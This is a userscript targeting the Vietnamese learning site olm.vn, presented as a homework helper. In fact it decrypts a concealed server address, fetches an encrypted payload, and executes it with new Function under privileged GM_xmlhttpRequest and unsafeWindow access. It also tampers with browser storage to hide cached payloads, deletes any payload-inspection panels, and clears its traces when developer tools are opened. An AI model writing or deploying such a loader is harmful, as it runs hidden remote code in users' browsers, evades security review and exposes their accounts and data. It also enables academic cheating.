// ==UserScript==
// @name         THIÊN TAI TÙ TỘI
// @namespace    dev.luongtuyen
// @version      9.2.0
// @description  hỗ trợ làm bài tập nhanh chóng
// @author       Thiên Tai Tù Tội
// @match        https://olm.vn/*
// @match        https://*.olm.vn/*
// @run-at       document-start
// @grant        unsafeWindow
// @grant        GM_addStyle
// @grant        GM_xmlhttpRequest
// @connect      modgame.vercel.app
// @connect      YOUR_SERVER_DOMAIN
// @connect      gamehayvl.com
// @connect      olm.vn
// ==/UserScript==

(function() {
  'use strict';
  const enc = new TextEncoder;
  const dec = new TextDecoder;
  const _crypto = typeof crypto !== 'undefined' ? crypto : window.crypto;
  const subtle = _crypto.subtle;

  const __seal = (function () {
    const _masks = [90, 60, 150];
    const _frags = [
      [173,98,9,183,56,45,52,241,194,213,224,175],
      [163,7,115,193,37,146,150,164,85,69],
      [237,224,248,127,165,251,43,116,182,182]
    ];
    const _saltB64 = 'jsp8rtA+GCJuWjhg5coTaA==';
    const _iter = 120000;
    const _recUrl = { iv: 'zR6Mrj63Fh3oXnqM', data: 'NY1NyWw9LV/SuXV9auCOzFku/VVed+4fl3D8dYHV4W0Mv6IZPQIWsmJB' };
    const _recSec = { iv: 'a6vDlsiKbZ7vmmh3', data: 'QjEU/bGV+lw8YG4GBciqGILpOQAxp0nkjEqXg59CjgcriRu8vHFQIx4wqgkDDhCpqJUldsbjLM5H38MgcCtxr2hXiLe0y1XjvObGhe3haW8=' };

    function _b64ToBytes(b64) {
      const bin = atob(b64);
      const u = new Uint8Array(bin.length);
      for (let i = 0; i < bin.length; i++) u[i] = bin.charCodeAt(i);
      return u;
    }
    function _assemble() {
      const out = new Uint8Array(32);
      let o = 0;
      for (let f = 0; f < _frags.length; f++) {
        const fa = _frags[f], m = _masks[f];
        for (let i = 0; i < fa.length; i++) out[o++] = fa[i] ^ m;
      }
      return out;
    }
    async function _open(rec, key) {
      const pt = await subtle.decrypt(
        { name: 'AES-GCM', iv: _b64ToBytes(rec.iv) },
        key,
        _b64ToBytes(rec.data)
      );
      const u8 = new Uint8Array(pt);
      const txt = new TextDecoder().decode(u8);
      for (let i = 0; i < u8.length; i++) u8[i] = 0;
      return txt;
    }
    async function open() {
      const pass = _assemble();
      const base = await subtle.importKey('raw', pass, { name: 'PBKDF2' }, false, ['deriveKey']);
      for (let i = 0; i < pass.length; i++) pass[i] = 0;
      const key = await subtle.deriveKey(
        { name: 'PBKDF2', salt: _b64ToBytes(_saltB64), iterations: _iter, hash: 'SHA-256' },
        base,
        { name: 'AES-GCM', length: 256 },
        false,
        ['decrypt']
      );
      const url = await _open(_recUrl, key);
      const secret = await _open(_recSec, key);
      return { url: url, secret: secret };
    }
    return { open: open };
  })();

  void function __storageShield() {

    const _w = (function() {
      try { return (typeof unsafeWindow !== 'undefined') ? unsafeWindow : window; }
      catch (_) { return window; }
    })();

    if (!_w || !_w.Storage || !_w.Storage.prototype) return;
    const _proto = _w.Storage.prototype;

    const GUARDED = [
      '_tl_boot_cache_v9',
      '_tl_boot_cache_v8',
      '_tl_boot_cache_v7',
      '_tl_boot_cache'
    ];

    const DECOY = JSON.stringify({ ok: false, v: '0', src: '', t: 0 });

    const _origGet = _proto.getItem;
    const _origSet = _proto.setItem;
    const _origRem = _proto.removeItem;

    function _seal(name, fn) {
      try {
        const d = Object.getOwnPropertyDescriptor(_proto, name);

        if (d && d.configurable === false) return;
        Object.defineProperty(_proto, name, {
          value       : fn,
          writable    : false,
          configurable: false,
          enumerable  : true
        });
      } catch (_) {}
    }

    try {
      const _ls = _w.localStorage;
      GUARDED.forEach(function(k) {
        try {
          const raw = _origGet.call(_ls, k);
          if (!raw) return;
          const o = JSON.parse(raw);

          if (o && typeof o.src === 'string' && o.src.length > 100) {
            _origSet.call(_ls, k, DECOY);
          }
        } catch (_) {}
      });
    } catch (_) {}

    _seal('getItem', function(key) {
      if (typeof key === 'string' && GUARDED.indexOf(key) !== -1) {
        return null;
      }
      return _origGet.call(this, key);
    });

    _seal('setItem', function(key, value) {
      if (typeof key === 'string' && GUARDED.indexOf(key) !== -1) {
        _origSet.call(this, key, DECOY);
        return;
      }
      return _origSet.call(this, key, value);
    });

    _seal('removeItem', function(key) {
      return _origRem.call(this, key);
    });

  }();

  void function __panelDestroyer() {

    const SIGS = [
      'OLM Cache Inspector',
      'QUÉT TĨNH PAYLOAD',
      'Tải payload',
      'payload_v',
      '_tl_boot_cache'
    ];

    function _isInspectorEl(el) {
      if (!el || el.nodeType !== 1) return false;
      const t = el.textContent || '';
      for (let i = 0; i < SIGS.length; i++) {
        if (t.indexOf(SIGS[i]) !== -1) return true;
      }
      return false;
    }

    function _sweep() {
      try {
        const root = document.documentElement || document.body;
        if (!root) return;

        const candidates = root.querySelectorAll(
          'div[style*="2147483647"],div[style*="fixed"][style*="monospace"]'
        );
        candidates.forEach(function(el) {
          if (_isInspectorEl(el)) {
            try { el.remove(); } catch (_) {}
          }
        });
      } catch (_) {}
    }

    function _startObserver() {
      try {
        const target = document.documentElement || document.body || document;
        const obs = new MutationObserver(function(mutations) {
          for (let i = 0; i < mutations.length; i++) {
            const added = mutations[i].addedNodes;
            for (let j = 0; j < added.length; j++) {
              if (_isInspectorEl(added[j])) {
                try { added[j].remove(); } catch (_) {}
                _sweep();
              }
            }
          }
        });
        obs.observe(target, { childList: true, subtree: true });
      } catch (_) {}
    }

    _startObserver();
    if (typeof document !== 'undefined' && document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', _startObserver);
    }

    setInterval(_sweep, 2000);

  }();

  void function __devToolsWatcher() {
    const THRESHOLD_PX = 150;
    let _dtOpen = false;

    function _onDevToolsOpen() {
      if (_dtOpen) return;
      _dtOpen = true;

      try {
        const _w = (typeof unsafeWindow !== 'undefined') ? unsafeWindow : window;
        const _ls = _w && _w.localStorage;
        if (!_ls) return;
        [
          '_tl_boot_cache_v9',
          '_tl_boot_cache_v8',
          '_tl_boot_cache_v7',
          '_tl_boot_cache'
        ].forEach(function(k) {
          try { _ls.removeItem(k); } catch (_) {}
        });
      } catch (_) {}
    }

    function _check() {
      try {
        const dh = window.outerHeight - window.innerHeight;
        const dw = window.outerWidth  - window.innerWidth;
        if (dh > THRESHOLD_PX || dw > THRESHOLD_PX) {
          _onDevToolsOpen();
        } else {
          _dtOpen = false;
        }
      } catch (_) {}
    }

    setInterval(_check, 1200);
  }();

  try {
    if (typeof window !== 'undefined' && !window.__GMFunc__) {
      window.__GMFunc__ = new Proxy({}, {
        get: function(t, k) {
          if (k in t) return t[k];
          return function() {};
        },
        set: function(t, k, v) {
          t[k] = v;
          return true;
        }
      });
    }
  } catch (_) {}
  const __uw = typeof unsafeWindow !== 'undefined' ? unsafeWindow : window;
  const __gmStyle = typeof GM_addStyle !== 'undefined' ? GM_addStyle : function(css) {
    try {
      var s = document.createElement('style');
      s.textContent = css;
      (document.head || document.documentElement).appendChild(s);
    } catch (_) {}
  };
  const __gmXhr = typeof GM_xmlhttpRequest !== 'undefined' ? GM_xmlhttpRequest : function(d) {
    d = d || {};
    try {
      var ctrl = typeof AbortController !== 'undefined' ? new AbortController : null;
      var tmo = setTimeout(function() {
        if (ctrl) try {
          ctrl.abort();
        } catch (_) {}
      }, d.timeout || 2e4);
      var opts = {
        method: d.method || 'GET',
        headers: d.headers || {}
      };
      if (ctrl) opts.signal = ctrl.signal;
      if (d.data !== undefined && d.data !== null) opts.body = d.data;
      fetch(d.url, opts).then(function(r) {
        clearTimeout(tmo);
        return r.text().then(function(t) {
          return {
            s: r.status,
            t: t
          };
        });
      }).then(function(o) {
        if (d.onload) d.onload({
          status: o.s,
          responseText: o.t,
          response: o.t,
          readyState: 4
        });
      }).catch(function(e) {
        clearTimeout(tmo);
        if (d.onerror) d.onerror({
          error: String(e && e.message || e)
        });
      });
    } catch (e) {
      if (d.onerror) d.onerror({
        error: String(e && e.message || e)
      });
    }
  };
  function b64ToBytes(b64) {
    const bin = atob(b64);
    const out = new Uint8Array(bin.length);
    for (let i = 0; i < bin.length; i++) out[i] = bin.charCodeAt(i);
    return out;
  }
  function bytesToHex(buf) {
    const b = new Uint8Array(buf);
    let s = '';
    for (let i = 0; i < b.length; i++) s += b[i].toString(16).padStart(2, '0');
    return s;
  }
  async function apiPrefix(secret) {
    const key = await subtle.importKey('raw', enc.encode(secret), {
      name: 'HMAC',
      hash: 'SHA-256'
    }, false, [ 'sign' ]);
    const sig = await subtle.sign('HMAC', key, enc.encode('godmode:api:prefix:v4'));
    return '/' + bytesToHex(sig).slice(0, 12);
  }
  async function bootstrapKey(secret) {
    const base = await subtle.importKey('raw', enc.encode(secret), 'PBKDF2', false, [ 'deriveBits' ]);
    const bits = await subtle.deriveBits({
      name: 'PBKDF2',
      salt: enc.encode('tl-bootstrap-v8-salt'),
      iterations: 1e3,
      hash: 'SHA-256'
    }, base, 256);
    return subtle.importKey('raw', bits, {
      name: 'AES-GCM'
    }, false, [ 'decrypt' ]);
  }
  function gmFetch(url) {
    return new Promise((resolve, reject) => {
      __gmXhr({
        method: 'GET',
        url: url,
        timeout: 15e3,
        headers: {
          Accept: 'application/json'
        },
        onload: r => resolve({
          status: r.status,
          text: r.responseText
        }),
        onerror: () => reject(new Error('network')),
        ontimeout: () => reject(new Error('timeout'))
      });
    });
  }
  let __tl_fail_lock = false;
  let __tl_connector_tried = false;
  function fail(msg) {
    if (__tl_fail_lock) return;
    __tl_fail_lock = true;
    try {
      const div = document.createElement('div');
      div.style.cssText = 'position:fixed;inset:0;z-index:2147483647;background:#0d1117;color:#ff6b6b;display:flex;align-items:center;justify-content:center;font-family:monospace;font-size:14px;padding:20px;text-align:center;';
      div.textContent = '⚠️ LOADER: không load được vui lòng đợi.' + (msg || '');
      (document.documentElement || document.body).appendChild(div);
    } catch (_) {}
  }
  function runConnector(src, version) {
    if (__tl_connector_tried) return;
    __tl_connector_tried = true;
    try {
      new Function('GM_xmlhttpRequest', 'GM_addStyle', 'unsafeWindow', src).call(window, __gmXhr, __gmStyle, __uw);
    } catch (e) {
      fail('Lỗi chạy connector: ' + (e && e.message ? e.message : e));
    }
  }
  async function main() {
    let secrets = null;
    try {
      secrets = await __seal.open();

      const prefix = await apiPrefix(secrets.secret);
      const key = await bootstrapKey(secrets.secret);
      const r = await gmFetch(secrets.url + prefix + '/bootstrap.js');
      if (r.status === 404) {
        fail(' Vui lòng đợi Admin update.');
        return;
      }
      if (r.status !== 200) {
        throw new Error('HTTP ' + r.status);
      }
      const json = JSON.parse(r.text);
      if (!json || !json.ok || !json.payload) throw new Error('payload lỗi');
      const iv = b64ToBytes(json.payload.iv);
      const data = b64ToBytes(json.payload.data);
      const plain = await subtle.decrypt({
        name: 'AES-GCM',
        iv: iv
      }, key, data);
      const src = dec.decode(plain);
      try {
        secrets.url = null;
        secrets.secret = null;
        secrets = null;
      } catch (_) {}
      runConnector(src, json.v);
    } catch (e) {
      fail(e && e.message ? e.message : String(e));
    }
  }
  main();
})();
